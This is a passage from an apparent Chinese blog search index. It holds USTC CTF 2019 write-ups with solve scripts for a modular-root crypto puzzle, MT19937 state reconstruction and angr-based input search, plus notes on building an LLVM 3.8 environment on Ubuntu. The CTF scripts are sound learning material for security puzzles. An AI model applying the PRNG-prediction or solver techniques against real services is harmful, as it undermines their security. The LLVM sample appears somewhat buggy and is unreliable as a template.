10 % (x * y * y * y) == z 求n 可以类似与RSA，但是p=x,q=y^3,e=10 phi = (x-1)*(y-1)yy #!/usr/bin/env python3 from easy_math import x as p, y as q, z as c from sympy.ntheory.residue_ntheory import sqrt_mod import sympy.ntheory.residue_ntheory import gmpy2 def factor_(nn, *args, **kwargs): t = 0 while nn % p == 0: t += 1 nn //= p s = 0 while nn % q == 0: s += 1 nn //= q if nn != 1: print(nn) return None return {p: t, q: s} sympy.ntheory.residue_ntheory.factorint = factor_ n = p * q ** 3 phi = (p - 1) * (q ** 2) * (q - 1) root_5th_of_c = pow(c, gmpy2.invert(5, phi // 5), n) root_5th_of_1_all = set(pow(i, (phi // 5), n) for i in range(1, 20)) root_5th_of_1_all = set(r for r in set(root_5th_of_1_all) if pow(r, 5, n) == 1) root_5th_of_c_all = [root_5th_of_c * r % n for r in root_5th_of_1_all] m_all = [m for r in root_5th_of_c_all for m in sqrt_mod(r, n, True)] print(len(m_all)) for m in m_all: h = hex(m)[2:] if len(h) % 2 == 0 and bytes.fromhex(hex(m)[2:]).startswith(b\"flag\"): print(bytes.fromhex(hex(m)[2:]).decode()[:32]) ","date":"2019-10-31","objectID":"/ustc2019/:8:0","tags":null,"title":"USTC CTF 2019","uri":"/ustc2019/"},{"categories":["writeup"],"content":"大整数分解锦标赛 随机数预测问题，用反复 Help 得到的随机数来重构 MT19937 的内部状态 #!/usr/bin/env python3 class UncertainBit: def __init__(self, value): if value == 0 or value == 1 or value == None: self.value = value elif value == \"0\" or value == \"1\": self.value = int(value) elif value == \"X\": self.value = None elif isinstance(value, UncertainBit): self.value = value.value else: raise TypeError() def __and__(self, other): if self.value != None and other.value != None: return UncertainBit(self.value \u0026 other.value) if self.value == 0 or other.value == 0: return UncertainBit(0) return UncertainBit(None) def __or__(self, other): if self.value != None and other.value != None: return UncertainBit(self.value | other.value) if self.value == 1 or other.value == 1: return UncertainBit(1) return UncertainBit(None) def __xor__(self, other): if self.value != None and other.value != None: return UncertainBit(self.value ^ other.value) return UncertainBit(None) def __invert__(self): if self.value is None: return UncertainBit(None) else: return UncertainBit(1 - self.value) def __repr__(self): if self.value is None: return \"X\" else: return str(self.value) def combine(self, other): if self.value != None and other.value != None: if self.value != other.value: raise ValueError() if self.value != None: return UncertainBit(self.value) return UncertainBit(other.value) def repeat(self, n): return UncertainBitVector(n, [self for _ in range(n)]) class UncertainBitVector: def __init__(self, bits, value=None): self.bits = bits self.vec = [UncertainBit(0) for _ in range(len(self))] if value is None: for i in range(len(self)): self[i] = None elif isinstance(value, int): if value.bit_length() \u003e len(self): raise ValueError() for i in range(value.bit_length()): self[i] = (value \u003e\u003e i) \u0026 1 else: if len(value) \u003e len(self): raise ValueError() for i in range(len(value)): self[i] = value[i] def __len__(self): return self.bits def __getitem__(self, key): if isinstance(key, int): if key \u003e= len(self): return UncertainBit(0) return self.vec[key] elif isinstance(key, slice): bv = self.vec[key] return UncertainBitVector(len(bv), bv) else: raise TypeError() def __setitem__(self, key, value): if isinstance(key, int): self.vec[key] = UncertainBit(value) elif isinstance(key, slice): raise NotImplementedError() else: raise TypeError() def __and__(self, other): if isinstance(other, int): other = UncertainBitVector(other.bit_length(), other) bits = min(len(self), len(other)) return UncertainBitVector(bits, [self[i] \u0026 other[i] for i in range(bits)]) def __rand__(self, other): return self \u0026 other def __or__(self, other): if isinstance(other, int): other = UncertainBitVector(other.bit_length(), other) bits = max(len(self), len(other)) return UncertainBitVector(bits, [self[i] | other[i] for i in range(bits)]) def __ror__(self, other): return self \u0026 other def __xor__(self, other): if isinstance(other, int): other = UncertainBitVector(other.bit_length(), other) bits = max(len(self), len(other)) return UncertainBitVector(bits, [self[i] ^ other[i] for i in range(bits)]) def __rxor__(self, other): return self \u0026 other def __lshift__(self, other): bits = len(self) + other return UncertainBitVector(bits, [0] * other + self.vec) def __rshift__(self, other): bits = max(len(self) - other, 0) return UncertainBitVector(bits, self.vec[other:]) def __sub__(self, other): if isinstance(other, int): other = UncertainBitVector(other.bit_length(), other) r = [] carry = UncertainBit(0) for i in range(len(self)): r.append(self[i] ^ other[i] ^ carry) carry = ~((self[i] \u0026 ~other[i]) | (self[i] \u0026 ~carry) | (~other[i] \u0026 ~carry)) if carry.value != 0: raise OverflowError() return UncertainBitVector(len(self), r) def __repr__(self): return \"\".join([str(b) for b in reversed(self.vec)]) def sign_ext(self, bits): if bits \u003c len(self): raise ValueError() return UncertainBitVector(bits, self.vec + [self[-1]] * (bits - len(self))) def combine(self, other): if len(self) != len(other): raise ValueError() else: return UncertainBitVector( len(self), [sel","date":"2019-10-31","objectID":"/ustc2019/:9:0","tags":null,"title":"USTC CTF 2019","uri":"/ustc2019/"},{"categories":["writeup"],"content":"tinyELF 题目很简单，但是在wp上看到了用angr解题的方法，记录一下。 emmm一直说要研究angr，希望能提上日程…菜还是要多读书 程序中的可见字符串: strings tinyELF please in put flag: correct 用angr求解什么样的输入可以让程序输出\"correct\" import angr proj = angr.Project(\"tinyELF\") simgr = proj.factory.simgr() simgr.explore(find=lambda s: b\"correct\" in s.posix.dumps(1)) print(simgr.found[0].posix.dumps(0)) 运行一下就能出flag ","date":"2019-10-31","objectID":"/ustc2019/:10:0","tags":null,"title":"USTC CTF 2019","uri":"/ustc2019/"},{"categories":["notes"],"content":"安装clang和cmake sudo apt-get install clang cmake ","date":"2019-10-08","objectID":"/llvm/:0:1","tags":null,"title":"ubuntu下LLVM开发环境的配置","uri":"/llvm/"},{"categories":["notes"],"content":"安装llvm sudo apt-get install llvm 使用这种方法我默认安装上的llvm版本为3.8.0，安装后的文件目录为/usr/share/llvm-3.8 ","date":"2019-10-08","objectID":"/llvm/:0:2","tags":null,"title":"ubuntu下LLVM开发环境的配置","uri":"/llvm/"},{"categories":["notes"],"content":"修改LLVMConfig.cmake文件 set(LLVM_CMAKE_DIR \"${LLVM_INSTALL_PREFIX}/share/llvm/cmake\") 改为 set(LLVM_CMAKE_DIR \"${LLVM_INSTALL_PREFIX}/share/llvm-3.8/cmake\") ","date":"2019-10-08","objectID":"/llvm/:0:3","tags":null,"title":"ubuntu下LLVM开发环境的配置","uri":"/llvm/"},{"categories":["notes"],"content":"修改LLVMExports-relwithdebinfo.cmake文件 由于权限问题不能直接打开修改，在命令行中写入: sudo gedit LLVMExports-relwithdebinfo.cmake 对文件进行如下修改: #Commands may need to know the format version. set(CMAKE_IMPORT_FILE_VERSION 1) set(_IMPORT_PREFIX \"/usr/lib/llvm-3.8\") 注释与Polly相关的库引用 # Import target \"PollyISL\" for configuration \"RelWithDebInfo\" # set_property(TARGET PollyISL APPEND PROPERTY IMPORTED_CONFIGURATIONS RELWITHDEBINFO) # set_target_properties(PollyISL PROPERTIES # IMPORTED_LINK_INTERFACE_LANGUAGES_RELWITHDEBINFO \"C\" # IMPORTED_LOCATION_RELWITHDEBINFO \"${_IMPORT_PREFIX}/lib/libPollyISL.a\" # ) # # list(APPEND _IMPORT_CHECK_TARGETS PollyISL ) # list(APPEND _IMPORT_CHECK_FILES_FOR_PollyISL \"${_IMPORT_PREFIX}/lib/libPollyISL.a\" ) # # # Import target \"Polly\" for configuration \"RelWithDebInfo\" # set_property(TARGET Polly APPEND PROPERTY IMPORTED_CONFIGURATIONS RELWITHDEBINFO) # set_target_properties(Polly PROPERTIES # IMPORTED_LINK_INTERFACE_LANGUAGES_RELWITHDEBINFO \"CXX\" # IMPORTED_LOCATION_RELWITHDEBINFO \"${_IMPORT_PREFIX}/lib/libPolly.a\" # ) # # list(APPEND _IMPORT_CHECK_TARGETS Polly ) # list(APPEND _IMPORT_CHECK_FILES_FOR_Polly \"${_IMPORT_PREFIX}/lib/libPolly.a\" ) # # # Import target \"LLVMPolly\" for configuration \"RelWithDebInfo\" # set_property(TARGET LLVMPolly APPEND PROPERTY IMPORTED_CONFIGURATIONS RELWITHDEBINFO) # set_target_properties(LLVMPolly PROPERTIES # IMPORTED_LOCATION_RELWITHDEBINFO \"${_IMPORT_PREFIX}/lib/LLVMPolly.so\" # IMPORTED_NO_SONAME_RELWITHDEBINFO \"TRUE\" # ) # # list(APPEND _IMPORT_CHECK_TARGETS LLVMPolly ) # list(APPEND _IMPORT_CHECK_FILES_FOR_LLVMPolly \"${_IMPORT_PREFIX}/lib/LLVMPolly.so\" ) ","date":"2019-10-08","objectID":"/llvm/:0:4","tags":null,"title":"ubuntu下LLVM开发环境的配置","uri":"/llvm/"},{"categories":["notes"],"content":"使用LLVM进行开发 新建文件夹: HowToUseJIT 目录结构如下: HowToUseJIT -- src + -- HowToUseJIT.cpp -- CMakeLists.txt -- build 在HowToUseJIT文件夹下进行如下操作: cd build cmake .. make HowToUseJIT.cpp和CMakeLists.txt文件可以自己根据LLVM提供的API自行开发，也可以使用下面所给的例子： HowToUseJIT.cpp #include \"llvm/IR/LLVMContext.h\" #include \"llvm/IR/Function.h\" #include \"llvm/IR/BasicBlock.h\" #include \"llvm/ADT/ArrayRef.h\" #include \"llvm/IR/Module.h\" #include \"llvm/IR/IRBuilder.h\" #include \u003cvector\u003e #include \u003cstring\u003e int main() { llvm::LLVMContext \u0026 context = llvm::getGlobalContext(); llvm::Module *module = new llvm::Module(\"asdf\", context); llvm::IRBuilder\u003c\u003e builder(context); llvm::FunctionType *funcType = llvm::FunctionType::get(builder.getVoidTy(), false); llvm::Function *mainFunc = llvm::Function::Create(funcType, llvm::Function::ExternalLinkage, \"main\", module); llvm::BasicBlock *entry = llvm::BasicBlock::Create(context, \"entrypoint\", mainFunc); builder.SetInsertPoint(entry); llvm::Value *helloWorld = builder.CreateGlobalStringPtr(\"hello world!\\n\"); std::vector\u003cllvm::Type *\u003e putsArgs; putsArgs.push_back(builder.getInt8Ty()-\u003egetPointerTo()); llvm::ArrayRef\u003cllvm::Type*\u003e argsRef(putsArgs); llvm::FunctionType *putsType = llvm::FunctionType::get(builder.getInt32Ty(), argsRef, false); //llvm::Constant *putsFunc = module-\u003egetOrInsertFunction(\"puts\", putsType); llvm::Function *putsFunc = llvm::Function::Create(putsType, llvm::Function::ExternalLinkage, \"puts\", module); llvm::BasicBlock *putsentry = llvm::BasicBlock::Create(context, \"entrypoint\", putsFunc); builder.SetInsertPoint(putsentry); builder.CreateCall(putsFunc, helloWorld); builder.CreateRetVoid(); module-\u003edump(); } CMakeLists.txt cmake_minimum_required(VERSION 2.8) project(llvm_test) set(LLVM_TARGETS_TO_BUILD X86) set(LLVM_BUILD_RUNTIME OFF) set(LLVM_BUILD_TOOLS OFF) find_package(LLVM REQUIRED CONFIG) message(STATUS \"Found LLVM ${LLVM_INCLUDE_DIRS}\") message(STATUS \"Using LLVMConfig.cmake in: ${LLVM_DIR}\") SET (CMAKE_CXX_COMPILER_ENV_VAR \"clang++\") SET (CMAKE_CXX_FLAGS \"-std=c++11\") SET (CMAKE_CXX_FLAGS_DEBUG \"-g\") SET (CMAKE_CXX_FLAGS_MINSIZEREL \"-Os -DNDEBUG\") SET (CMAKE_CXX_FLAGS_RELEASE \"-O4 -DNDEBUG\") SET (CMAKE_CXX_FLAGS_RELWITHDEBINFO \"-O2 -g\") SET(EXECUTABLE_OUTPUT_PATH ${PROJECT_SOURCE_DIR}/bin) include_directories(${LLVM_INCLUDE_DIRS}) add_definitions(${LLVM_DEFINITIONS}) file(GLOB_RECURSE source_files \"${CMAKE_CURRENT_SOURCE_DIR}/src/*.cpp\") add_executable(llvm_test ${source_files}) install(TARGETS llvm_test RUNTIME DESTINATION bin) # Find the libraries that correspond to the LLVM components # that we wish to use llvm_map_components_to_libnames(llvm_libs Core ExecutionEngine Interpreter MC Support nativecodegen) # Link against LLVM libraries target_link_libraries(llvm_test ${llvm_libs}) 如果编译通过说明LLVM开发环境搭建成功，如果报一些库文件缺失的错误有可能是因为默认LLVM文件夹的文件名为llvm而安装LLVM后自带的文件名为llvm-3.8可以根据报错内容对/usr/share/llvm-3.8或usr/lib/llvm-3.8的文件名进行修改 ","date":"2019-10-08","objectID":"/llvm/:0:5","tags":null,"title":"ubuntu下LLVM开发环境的配置","uri":"/llvm/"}]